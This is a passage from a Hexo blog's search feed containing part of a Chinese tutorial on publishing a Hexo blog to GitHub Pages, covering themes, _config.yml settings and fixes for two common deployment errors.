s命令在本地查看效果修改，终稿使用hexo g &amp;&amp; hexo d命令发布到你的Github Pages上去，过程中可能会要求你输入自己的Github帐号和密码。</p><h2 id="Options"><a href="#Options" class="headerlink" title="Options"></a>Options</h2><h3 id="Options-1：主题"><a href="#Options-1：主题" class="headerlink" title="Options 1：主题"></a>Options 1：主题</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;按照上述步骤搭建好的个人博客，主题应该是hexo自带的landscape风格，如果不喜欢的话，<a href="https://hexo.io/themes/">这里</a>有很多不同风格的主题，大家可以选择自己喜欢的。</p><h3 id="Options-2：配置"><a href="#Options-2：配置" class="headerlink" title="Options 2：配置"></a>Options 2：配置</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;包括hexo的配置以及自己更换的主题的配置，都是通过修改_config.yml文件实现。关于hexo的配置，<a href="https://hexo.io/docs/configuration">这个页面</a>也许对你有用。至于不同的主题的配置，则需要自己去找一下喽。</p><h2 id="Problems"><a href="#Problems" class="headerlink" title="Problems"></a>Problems</h2><h3 id="Problem-1：找不到Git"><a href="#Problem-1：找不到Git" class="headerlink" title="Problem 1：找不到Git"></a>Problem 1：找不到Git</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;在执行hexo d命令时可能会出现这个错误，解决方法：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure><h3 id="Problem-2：无法自动检测邮箱"><a href="#Problem-2：无法自动检测邮箱" class="headerlink" title="Problem 2：无法自动检测邮箱"></a>Problem 2：无法自动检测邮箱</h3><p>&amp;#160; &amp;#160; &amp;#160; &amp;#160;同样在执行hexo g &amp;&amp; hexo d命令时可能会出现该问题，解决方法会在报错信息中给出，只需执行相应命令即可。</p>]]></content>
      
      
      <categories>
          
          <category> Miscellaneous </category>
          
          <category> Sites </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Blogs </tag>
            
            <tag> Hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
